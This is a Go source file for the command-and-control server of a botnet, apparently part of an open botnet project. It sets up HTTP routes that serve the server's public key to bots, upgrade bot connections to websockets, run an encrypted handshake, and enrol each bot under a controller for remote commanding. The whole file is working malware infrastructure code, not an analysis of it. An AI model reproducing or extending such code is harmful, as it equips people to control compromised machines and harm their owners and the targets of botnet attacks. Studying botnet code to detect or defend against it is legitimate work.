package ccserver

import (
	"encoding/json"

	"log"
	"net/http"

	"github.com/adrianosela/botnet/command-and-control/ccworker"
	"github.com/adrianosela/botnet/lib/protocol"
	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

// NewCCService returns an HTTP MUX with handler functions
func NewCCService() *mux.Router {
	cc, err := NewCmdAndCtrl()
	if err != nil {
		log.Fatalf("could not create new command and control: %s", err)
	}
	go cc.StartBotnet()

	router := mux.NewRouter()

	// exposes a public key for bots to encrypt commands before sending
	router.Methods(http.MethodGet).Path(protocol.KeyEndpoint).HandlerFunc(cc.KeyHTTPHandler)
	// accepts new bots and handles all communication to bots
	router.Methods(http.MethodGet).Path(protocol.CCEndpoint).HandlerFunc(cc.CommandAndControlHTTPHandler)

	return router
}

// KeyHTTPHandler serves the CC server's public key
func (cc *CommandAndControl) KeyHTTPHandler(w http.ResponseWriter, r *http.Request) {
	ccDiscoveryBytes, err := json.Marshal(&protocol.CCDiscovery{Key: cc.ServerKey})
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("could not return command and control discovery struct"))
		return
	}
	w.WriteHeader(http.StatusOK)
	w.Write(ccDiscoveryBytes)
	return
}

// CommandAndControlHTTPHandler serves the HTTP entrypoint to the botnet websocket
func (cc *CommandAndControl) CommandAndControlHTTPHandler(w http.ResponseWriter, r *http.Request) {
	// upgrade protocol to websockets connection
	upgrader := websocket.Upgrader{ReadBufferSize: 1024, WriteBufferSize: 1024}
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("could not upgrade to WS connection"))
		return
	}
	// receive public key from bot handshake
	botPubKey, err := protocol.BotHandshake(conn, cc.msgDecryptKey)
	if err != nil {
		log.Printf("received join request but failed to complete net handshake: %s", err)
		return
	}
	// create new bot bontroller
	botController, err := ccworker.NewBotWorker(cc.msgDecryptKey, botPubKey, conn, cc.recvMsgChan)
	if err != nil {
		log.Printf("could not create new slave controller for new slave: %s", err)
		return
	}
	// add to net and start socket handlers
	cc.EnrolBot(botController)
}
